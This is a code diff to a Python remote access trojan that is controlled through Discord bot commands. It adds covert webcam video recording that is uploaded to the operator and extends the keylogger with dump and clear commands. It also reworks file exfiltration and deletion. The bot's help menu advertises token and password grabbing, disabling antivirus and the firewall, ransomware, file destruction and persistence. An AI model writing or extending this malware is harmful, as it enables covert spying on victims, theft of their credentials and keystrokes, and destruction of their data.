@@ -882,25 +882,54 @@ async def mic_record(ctx, duration: int = 10):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-@bot.command(name='canrec')
+@bot.command(name='camrec')
 @is_authorized()
-async def can_record(ctx, duration: int = 10):
-    if not AUDIO_AVAILABLE:
-        await send_embed(ctx, "Error", "PyAudio not installed - microphone unavailable", discord.Color.red())
-        return
+async def cam_record(ctx, duration: int = 10):
+    """Record webcam video for X seconds (5-300)"""
     if duration < 5:
         duration = 5
     if duration > 300:
         duration = 300
-    await send_embed(ctx, "🎤 Recording Test", f"Recording for {duration} seconds...", discord.Color.blue())
-    path = record_mic(duration)
-    if path and os.path.exists(path):
-        with open(path, 'rb') as f:
-            await ctx.send(file=discord.File(f))
-        os.remove(path)
-        await send_embed(ctx, "✅ Success", "Microphone recording test complete", discord.Color.green())
-    else:
-        await send_embed(ctx, "❌ Failed", "Could not record microphone", discord.Color.red())
+    
+    await send_embed(ctx, "📷 Webcam Recording", f"Recording for {duration} seconds...", discord.Color.blue())
+    
+    try:
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            await send_embed(ctx, "❌ Error", "No webcam found", discord.Color.red())
+            return
+        
+        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+        fps = 20.0
+        
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        output_path = os.environ['TEMP'] + "\\webcam_recording.avi"
+        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
+        
+        start_time = time.time()
+        frame_count = 0
+        
+        while (time.time() - start_time) < duration:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            out.write(frame)
+            frame_count += 1
+            time.sleep(0.05)
+        
+        cap.release()
+        out.release()
+        
+        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
+            with open(output_path, 'rb') as f:
+                await ctx.send(file=discord.File(f))
+            os.remove(output_path)
+            await send_embed(ctx, "✅ Success", f"Webcam recording complete ({frame_count} frames)", discord.Color.green())
+        else:
+            await send_embed(ctx, "❌ Error", "Failed to record webcam", discord.Color.red())
+    except Exception as e:
+        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
 
 @bot.command(name='clipboard')
 @is_authorized()
@@ -1043,7 +1072,7 @@ async def killswitch(ctx):
 
 @bot.command(name='keylog')
 @is_authorized()
-async def keylog(ctx, action: str = None):
+async def keylog_cmd(ctx, action: str = None):
     global keylog_active
     if action == 'start':
         if keylog_active:
@@ -1064,7 +1093,7 @@ async def keylog(ctx, action: str = None):
                 await ctx.send(file=discord.File(keylog_file))
             else:
                 await send_embed(ctx, "Keylog Dump", f"```{data}```", discord.Color.blue())
-            os.remove(keylog_file)
+            # Don't remove after dump - user can clear separately
         else:
             await send_embed(ctx, "Keylog", "No logs", discord.Color.red())
     else:
@@ -1073,12 +1102,34 @@ async def keylog(ctx, action: str = None):
 @bot.command(name='keylogstart')
 @is_authorized()
 async def keylog_start(ctx):
-    await keylog(ctx, 'start')
+    await keylog_cmd(ctx, 'start')
 
 @bot.command(name='keylogstop')
 @is_authorized()
 async def keylog_stop(ctx):
-    await keylog(ctx, 'stop')
+    await keylog_cmd(ctx, 'stop')
+
+@bot.command(name='keylogdump')
+@is_authorized()
+async def keylog_dump(ctx):
+    if os.path.exists(keylog_file):
+        with open(keylog_file, 'r', encoding='utf-8') as f:
+            data = f.read()
+        if len(data) > 1900:
+            await ctx.send(file=discord.File(keylog_file))
+        else:
+            await send_embed(ctx, "⌨️ Keylog Dump", f"```{data}```", discord.Color.blue())
+    else:
+        await send_embed(ctx, "⌨️ Keylog", "No logs found", discord.Color.red())
+
+@bot.command(name='keylogclear')
+@is_authorized()
+async def keylog_clear(ctx):
+    if os.path.exists(keylog_file):
+        os.remove(keylog_file)
+        await send_embed(ctx, "⌨️ Keylog", "Logs cleared", discord.Color.green())
+    else:
+        await send_embed(ctx, "⌨️ Keylog", "No logs to clear", discord.Color.orange())
 
 @bot.command(name='keylogstatus')
 @is_authorized()
@@ -1213,13 +1264,23 @@ async def upload_file(ctx):
 @bot.command(name='download')
 @is_authorized()
 async def download_file(ctx, *, filepath: str):
-    if os.path.exists(filepath) and os.path.isfile(filepath):
-        if os.path.getsize(filepath) > 104857600:
-            await send_embed(ctx, "Error", "File >100MB", discord.Color.red())
-            return
-        await ctx.send(file=discord.File(filepath))
-    else:
-        await send_embed(ctx, "Error", "File not found", discord.Color.red())
+    try:
+        # If path is relative, prepend current_path
+        if not os.path.isabs(filepath):
+            filepath = os.path.join(current_path, filepath)
+        
+        # Normalize path
+        filepath = os.path.normpath(filepath)
+        
+        if os.path.exists(filepath) and os.path.isfile(filepath):
+            if os.path.getsize(filepath) > 104857600:
+                await send_embed(ctx, "Error", "File >100MB", discord.Color.red())
+                return
+            await ctx.send(file=discord.File(filepath))
+        else:
+            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
 
 @bot.command(name='exit')
 @is_authorized()
@@ -1302,8 +1363,6 @@ async def caps_lock_toggle(ctx):
 @is_authorized()
 async def caps_lock_on(ctx):
     try:
-        # Check if already on
-        import ctypes
         if ctypes.windll.user32.GetKeyState(0x14) & 0x0001:
             await send_embed(ctx, "🔠 Caps Lock", "Already ON", discord.Color.orange())
             return
@@ -1316,7 +1375,6 @@ async def caps_lock_on(ctx):
 @is_authorized()
 async def caps_lock_off(ctx):
     try:
-        import ctypes
         if not (ctypes.windll.user32.GetKeyState(0x14) & 0x0001):
             await send_embed(ctx, "🔠 Caps Lock", "Already OFF", discord.Color.orange())
             return
@@ -1383,12 +1441,12 @@ async def help_cmd(ctx):
     embed.add_field(name="Files", value="`cd`, `dir`, `listfiles`, `download`, `upload`, `delete`, `downloads`, `installed`", inline=False)
     embed.add_field(name="File Browsing", value="`downloadsfolder`, `documentsfolder`, `picturesfolder`, `videosfolder`, `desktopfolder`", inline=False)
     embed.add_field(name="Input", value="`click`, `press`, `screenshot`, `blockinput`, `unblockinput`, `shake`, `shakestop`", inline=False)
-    embed.add_field(name="Media", value="`webcampic`, `mic`, `canrec`, `voice`, `playpause`, `nexttrack`, `wallpaper`", inline=False)
+    embed.add_field(name="Media", value="`webcampic`, `mic`, `camrec`, `voice`, `playpause`, `nexttrack`, `wallpaper`", inline=False)
     embed.add_field(name="Audio", value="`mute`, `unmute`, `capslock`, `capslockon`, `capslockoff`", inline=False)
     embed.add_field(name="Display", value="`fullscreenlock`, `fullscreenunlock`", inline=False)
     embed.add_field(name="Destructive", value="`filescramble`, `filedestroy`, `fileransom`, `virus`, `msgbox`", inline=False)
     embed.add_field(name="Security", value="`grabtokens`, `password`, `disabledefender`, `disablefirewall`, `disabletaskmgr`, `enabletaskmgr`", inline=False)
-    embed.add_field(name="Keylogger", value="`keylog start/stop/dump`, `keylogstart`, `keylogstop`, `keylogstatus`", inline=False)
+    embed.add_field(name="Keylogger", value="`keylog start/stop/dump`, `keylogstart`, `keylogstop`, `keylogdump`, `keylogclear`, `keylogstatus`", inline=False)
     embed.add_field(name="Process", value="`listprocess`, `prockill`, `listapps`, `open`, `close`", inline=False)
     embed.add_field(name="Persistence", value="`persistence`, `killswitch`, `startup`", inline=False)
     embed.add_field(name="Other", value="`cmd`, `website`, `clipboard`, `exit`", inline=False)
@@ -1425,8 +1483,13 @@ async def dir_cmd(ctx):
 @is_authorized()
 async def delete_file(ctx, *, filepath: str):
     try:
-        os.remove(filepath)
-        await send_embed(ctx, "Deleted", filepath, discord.Color.red())
+        if not os.path.isabs(filepath):
+            filepath = os.path.join(current_path, filepath)
+        if os.path.exists(filepath):
+            os.remove(filepath)
+            await send_embed(ctx, "Deleted", filepath, discord.Color.red())
+        else:
+            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
